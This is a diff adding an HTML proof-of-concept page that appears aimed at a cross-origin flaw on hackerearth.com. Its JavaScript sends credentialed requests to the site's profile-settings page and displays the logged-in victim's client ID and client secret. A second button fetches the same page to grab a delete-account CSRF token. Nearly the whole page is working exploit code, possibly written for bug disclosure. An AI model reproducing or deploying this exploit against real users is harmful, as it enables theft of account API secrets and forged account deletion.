@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<div>
+<h1>Getting hackerearth Client secrets for victim!!!</h1>
+<button type="button" onclick="loadDoc()">Get secrets!!!</button>
+<button type="button" onclick="get_csrf_token()">Get delete account csrf token!!!</button>
+  <div id="demo1"></div>
+  <div id="demo2"></div>
+</div>
+
+<script>
+function loadDoc() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        var parser=new DOMParser();
+        var xmlDoc=parser.parseFromString(this.responseText,"text/xml");
+        var clientId = xmlDoc.getElementById('client-id');
+        var clientSecret = xmlDoc.getElementById('client-secret');
+        console.log(clientId);
+        document.getElementById("demo1").innerHTML = clientId;
+        document.getElementById("demo2").innerHTML = clientSecret;
+    }
+  };
+  xhttp.open("GET", "https://www.hackerearth.com/users/profile-settings/", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+function get_csrf_token(){
+  var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML =
+      this.responseText;
+    }
+  };
+  xhttp.open("GET", "https://www.hackerearth.com/users/profile-settings/", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
